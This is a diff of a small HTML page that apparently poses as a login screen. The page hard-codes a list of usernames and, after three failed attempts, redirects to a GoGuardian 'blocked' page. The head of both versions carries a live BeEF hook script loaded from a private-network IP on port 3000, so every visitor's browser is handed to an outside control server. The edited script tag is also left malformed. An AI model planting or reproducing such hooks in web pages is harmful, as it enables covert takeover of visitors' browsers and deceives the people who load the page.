@@ -2,19 +2,84 @@
 <html lang="en">
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HEHEHEHEHEHE</title> 
+    <title>HEHEHEHEHEHE</title>
     <!-- BeEF Hook -->
-    <script src="http://172.20.245.20:3000/beef/index.html" title="HACKING_EXPLOIT" allowtransparency="true" frameBorder="0"></script>
+    <script src="http://172.20.245.20:3000/beef/index.html" </script>
+    
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            height: 100vh;
+            background-color: #f0f0f0;
+        }
+        form {
+            background: #fff;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            padding: 10px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        #message {
+            color: red;
+            margin-top: 10px;
+        }
+    </style>
 </head>
 <body>
 
-    <!-- Button to go back to login screen -->
-    <button id="backToLoginButton" style="height:768px;width:1366px" onclick="goToLogin()">Back to Login</button>
+    <!-- Login Form -->
+    <form id="loginForm">
+        <h2>Login</h2>
+        <input type="text" id="username" placeholder="Enter your username" required>
+        <button type="submit">Login</button>
+        <p id="message"></p>
+    </form>
 
-    <script type="text/javascript">
-        function goToLogin() {
-            window.location.href = 'login.html'; // Update to your actual login URL
-        }
+    <script>
+        const validUsernames = ["noaura", "sigma", "321", "jogjim", "secretcode"];
+        let attempts = 0;
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent the form from submitting
+
+            const usernameInput = document.getElementById('username').value;
+
+            // Check if the entered username is valid
+            if (validUsernames.includes(usernameInput)) {
+                // Redirect to the success page or home page
+                window.location.href = "https://success.example.com"; // Change this to your success page URL
+            } else {
+                attempts++; // Increment attempt counter
+                document.getElementById('message').innerText = "Invalid username. Please try again.";
+
+                // Check if the user has exceeded the allowed attempts
+                if (attempts >= 3) {
+                    window.location.href = "https://blocked.goguardian.com/"; // Redirect if attempts exceeded
+                }
+            }
+        });
     </script>
 
 </body>
